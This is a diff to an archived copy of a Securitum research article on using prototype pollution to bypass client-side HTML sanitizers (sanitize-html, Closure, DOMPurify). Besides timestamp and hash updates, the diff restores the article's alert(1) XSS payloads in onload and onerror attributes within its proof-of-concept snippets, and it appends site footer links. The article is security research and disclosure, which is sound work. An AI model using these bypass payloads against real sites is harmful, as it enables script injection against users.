@@ -6,9 +6,9 @@ resource: "https://www.securitum.com/prototype-pollution-and-bypassing-client-si
 tags: [article, webseclist-reference, en, securitum-com, prototype-pollution, sanitizer-bypass, xss, gadget-chain, filter-bypass, javascript, nodejs, tooling, owasp-a03-2021, owasp-a05-2021, owasp-a08-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-11T17:45:31+00:00"
+  at: "2026-08-16T00:01:12+00:00"
 status: stable
-stale_after: 2027-08-11
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html"
@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2020.md:70"
 commit: ""
-content_sha256: 4c4a488dfcb51f6240da5f946d41510690d135d6c5e1e4972c672c1481fe004c
+content_sha256: d0171e1767e051731c0601e70f04d50b67e50b8c67ad848962ac795b05126e13
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +34,7 @@ publisher_english: ""
 raw_sha256: c3fa325de4a3eb817f5697fe76eed78d9361b6e30c20419ca0373061f05146d7
 retrieved_from: "https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html"
 retrieved_kind: stored
-retrieved_utc: "2026-08-11T17:45:31+00:00"
+retrieved_utc: "2026-08-16T00:01:12+00:00"
 slug: securitum-com-securitum-leading-european-penetration-testing-company-3
 snapshot: ""
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html>
-- Preserved from: https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html (stored) on 2026-08-11
+- Preserved from: https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -290,7 +290,7 @@ sanitizeHtml.defaults = {
 
 `allowedTags` property is an array, which means we cannot use it in prototype pollution. It's worth noticing, though, that `iframe` is allowed.
 
-Moving forward, `allowedAttributes` is a map, which gives an idea that adding property `iframe: ['onload']` should make it possible to perform XSS via `<iframe >.`
+Moving forward, `allowedAttributes` is a map, which gives an idea that adding property `iframe: ['onload']` should make it possible to perform XSS via `<iframe onload=alert(1)>`.
 
 Internally, `allowedAttributes` are rewritten to a variable `allowedAttributesMap`. And here's the logic that decides whether an attribute should be allowed or not (`name` is the name of the current tag, and `a` is the name of the attribute):
 
@@ -416,7 +416,7 @@ The code below proves the bypass:
                         </script>
                         <body>
                         <script>
-                          const html = '<img src
+                          const html = '<img src onerror=alert(1)>';
                           const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
                           const sanitized = sanitizer.sanitize(html);
                           const node = goog.dom.safeHtmlToNode(sanitized);
@@ -522,8 +522,8 @@ So DOMPurify checks whether current browser is modern enough to even work with D
                             const js = await (await fetch(DOMPURIFY_URL)).text();
                             eval(js);
 
-                            console.log(DOMPurify.sanitize('<img src
-                            // Logs: "<img src  i.e. unsanitized HTML
+                            console.log(DOMPurify.sanitize('<img src onerror=alert(1)>'));
+                            // Logs: "<img src onerror=alert(1)>", i.e. unsanitized HTML
                           })();
 
 ```
@@ -560,3 +560,80 @@ I believe that thanks to [pollute.js](https://github.com/securitum/research/tree
 The conclusion is that prototype pollution can lead to bypass of all popular HTML sanitizers. It can usually be done by affecting the allow-list of elements or attributes.
 
 As a final note, if you ever find a prototype pollution in Google Search, then you have XSS in the search field!
+
+# Other Insights
+
+ ![](https://www.securitum.com/images/ilustration-pentest-chronicles-article.png)
+
+### Helping secure DOMPurify
+
+# MICHAŁ BENTKOWSKI
+
+# December 21, 2020
+
+Within last year I shared a a few writeups of my bypasses of HTML sanitizers, including: > Write-up of DOMPurify 2.0.0 bypass using mutation XSS > Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass While breaking sanitizers is fun and I thoroughly enjoy doing it, I reached a point where I began to think whether I can contribute even more and propose a fix that will kill an entire class of bypasses.
+
+ [READ pentest chronicle](https://www.securitum.com/helping_secure_dompurify.html)
+
+ ![](https://www.securitum.com/images/ilustration-pentest-chronicles3.png)
+
+### Pyscript - or rather Python in your browser + what can be done with it
+
+# Michał Bentkowski
+
+# September 10, 2022
+
+A few days ago, the Anaconda project announced the PyScript framework, which allows Python code to be executed directly in the browser. Additionally, it also covers its integration with HTML and JS code. An execution of the Python code in the browser is not new; the pyodide project has allowed this for a long time...
+
+ [READ pentest chronicle](https://www.securitum.com/pyscript__or_rather_python_in_your_browser__what_can_be_done_with_it.html)
+
+ ![](https://www.securitum.com/images/ilustration-pentest-chronicles2.png)
+
+### Art of bug bounty a way from JS file analysis to XSS
+
+# jAKUB żOCZEK
+
+# July 1, 2020
+
+Summary: During my research on other bug bounty program I've found Cross-Site Scripting vulnerability in cmp3p.js file, which allows attacker to execute arbitrary javascript code in context of domain that include mentioned script. Below you can find the way of finding bug bounty vulnerabilities from the beginning to the ...
+
+ [READ pentest chronicle](https://www.securitum.com/art-of-bug-bounty-a-way-from-js-file-analysis-to-xss.html)
+
+ ![](https://www.securitum.com/images/contact.png)
+
+## Any questions?
+
+#  Happy to get a call or email
+and help!
+
+ [CONTACT US](https://www.securitum.com/contact.html) ![](https://static.shuffle.dev/uploads/files/a6/a6f2940854c19714ee211d1b0f6281ba8f8e7687/Arrow-61.png)
+
+ ![](https://static.shuffle.dev/uploads/files/a6/a6f2940854c19714ee211d1b0f6281ba8f8e7687/Logo-Securitum.png)
+
+ 
+
+ 
+
+ 
+
+ 
+
+ [### Services](https://www.securitum.com/services.html)
+
+ [### Pricing](https://www.securitum.com/pricing.html)
+
+ [### Resources](https://www.securitum.com/resources.html)
+
+ [### Company](https://www.securitum.com/about-us.html)
+
+ [### Partnership](https://www.securitum.com/partnership.html)
+
+ 
+
+ 
+
+ 
+
+ 
+
+ [ Terms and conditions ](https://www.securitum.com/terms-and-conditions.html)
